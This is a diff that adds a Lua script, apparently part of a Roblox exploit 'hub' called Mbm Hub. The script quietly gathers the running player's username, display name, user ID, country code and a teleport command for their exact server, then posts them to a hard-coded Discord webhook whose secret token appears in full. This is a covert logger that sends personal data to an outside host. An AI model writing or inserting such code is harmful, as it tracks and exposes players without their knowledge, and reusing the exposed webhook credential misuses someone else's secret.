@@ -1,0 +1,45 @@
+    local LocalizationService = game:GetService("LocalizationService")
+    local player = game.Players.LocalPlayer
+    local HttpService = game:GetService("HttpService")
+    
+    local code = LocalizationService:GetCountryRegionForPlayerAsync(player)
+    local data = {
+        embeds = {
+            {
+                title = "Profile",
+                url = "https://www.roblox.com/users/" .. player.UserId,
+                description = "||```" .. player.DisplayName .. " (" .. player.Name .. ") ```||",
+                color = tonumber(322852),
+                fields = {
+                    {
+                        name = "country",
+                        value = "```Player's country code: " .. code .. "```",
+                        inline = true
+                    },
+                    {
+                        name = "server",
+                        value = '```game:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..', "'..game.JobId..'", game.Players.LocalPlayer)```',
+                        inline = true
+                    },
+                    {
+                        name = "ty for using",
+                        value = "Main script Mbm Hub",
+                        inline = true
+                    }
+                }
+            }
+        }
+    }
+    
+    local jsonData = HttpService:JSONEncode(data)
+    local webhookUrl = "https://discord.com/api/webhooks/1268816659368644608/MyZnjx5PiG-0o4ZsmMMWX6WP9gHi6lz5q1WeiQ-m0mFHbpGy26XZo2ITZ2skdxwFRQth"
+    local headers = {["Content-Type"] = "application/json"}
+    local request = http_request or request or HttpPost or syn.request
+    local final = {Url = webhookUrl, Body = jsonData, Method = "POST", Headers = headers}
+    
+    local success, response = pcall(request, final)
+    if success then
+        print("Profile information sent to Discord.")
+    else
+        print("Failed to send profile information to Discord: " .. response)
+    end
